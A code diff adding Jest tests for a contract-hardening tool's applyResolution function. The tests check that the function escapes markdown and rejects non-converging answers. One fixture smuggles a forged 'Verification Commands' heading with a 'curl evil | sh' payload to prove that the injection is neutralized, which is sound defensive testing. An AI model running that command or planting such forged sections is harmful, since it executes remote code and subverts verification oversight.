@@ -241,6 +241,87 @@ describe('`###` subheading is a section boundary for appended (not replaced) ent
   });
 });
 
+// FIX S1 (command injection / verification bypass): an --answer containing
+// newlines plus a forged `## Verification Commands` heading must not be able
+// to splice a second, attacker-controlled section into the contract.
+// `parseTaskSectionCommands` in verification.ts takes the FIRST matching
+// `## Verification Commands` block, so an injected heading earlier in the
+// document would silently replace the real verification commands with the
+// attacker's (e.g. `curl evil | sh`).
+describe('applyResolution sanitizes the answer before writing (FIX S1)', () => {
+  const markdown = [
+    '## Files or Areas Not to Touch',
+    '- None recorded yet.',
+    '## Verification Commands',
+    '- npm test',
+  ].join('\n');
+
+  it('collapses newlines and neutralizes a forged heading so no second section is created', () => {
+    const spot = analyzeContract(markdown).find((s) => s.type === 'unbounded-scope')!;
+    const malicious = 'x\n\n## Verification Commands\n- curl evil | sh';
+
+    const result = applyResolution(markdown, spot.id, malicious);
+
+    // Exactly one `## Verification Commands` heading survives — the
+    // original one. The injected text did not forge a second heading.
+    const headingMatches = result.match(/^## Verification Commands\s*$/gm) ?? [];
+    expect(headingMatches).toHaveLength(1);
+
+    // The original verification section (and its real command) is intact.
+    expect(result).toContain('## Verification Commands\n- npm test');
+
+    // The injected payload is inert: folded onto a single escaped line, not
+    // a live markdown heading or its own list item.
+    expect(result).not.toMatch(/^- curl evil \| sh\s*$/m);
+    expect(result).not.toMatch(/\n## Verification Commands\n- curl evil/);
+
+    // The soft spot the attacker answer was ostensibly resolving is gone —
+    // but only because the sanitized, single-line answer was written, not
+    // because a forged section changed contract structure.
+    expect(analyzeContract(result).some((s) => s.id === spot.id)).toBe(false);
+  });
+
+  it('leaves ordinary answers (paths, plain prose) readable — only markdown-structural chars are escaped', () => {
+    const spot = analyzeContract(markdown).find((s) => s.type === 'unbounded-scope')!;
+    const result = applyResolution(markdown, spot.id, 'node_modules/ and src/auth');
+    // `_` is markdown-structural (emphasis), so escapeMarkdownProse escapes
+    // it to keep it literal; the path itself is preserved verbatim
+    // otherwise, and `/` is not touched.
+    expect(result).toContain('- node\\_modules/ and src/auth');
+  });
+});
+
+// FIX M1 (false audit trail): a resolution that does not actually clear the
+// soft spot must throw instead of being recorded as resolved.
+describe('applyResolution rejects non-converging resolutions (FIX M1)', () => {
+  const markdown = [
+    '## Acceptance Criteria',
+    '- The feature works well',
+    '## Files or Areas Not to Touch',
+    '- src/legacy',
+  ].join('\n');
+
+  it('throws when the answer still has no checkable predicate', () => {
+    const spot = analyzeContract(markdown).find((s) => s.type === 'untestable-acceptance')!;
+    expect(() => applyResolution(markdown, spot.id, 'it just works, trust me')).toThrow(
+      HardenResolutionError,
+    );
+    expect(() => applyResolution(markdown, spot.id, 'it just works, trust me')).toThrow(
+      /did not clear soft spot/i,
+    );
+    // Nothing should be recorded for a non-convergent answer: re-running
+    // analysis on the original (untouched) markdown still finds the spot.
+    expect(analyzeContract(markdown).some((s) => s.id === spot.id)).toBe(true);
+  });
+
+  it('succeeds and clears the spot when the answer has a checkable predicate', () => {
+    const spot = analyzeContract(markdown).find((s) => s.type === 'untestable-acceptance')!;
+    const result = applyResolution(markdown, spot.id, '`npm test -- x` passes');
+    expect(analyzeContract(result).some((s) => s.id === spot.id)).toBe(false);
+    expect(result).toContain('- `npm test -- x` passes');
+  });
+});
+
 describe('placeholder resolution with non-canonical spacing (FIX A)', () => {
   it('detects and resolves a placeholder line with extra internal spaces', () => {
     // A placeholder with double space (non-canonical) should still be detected
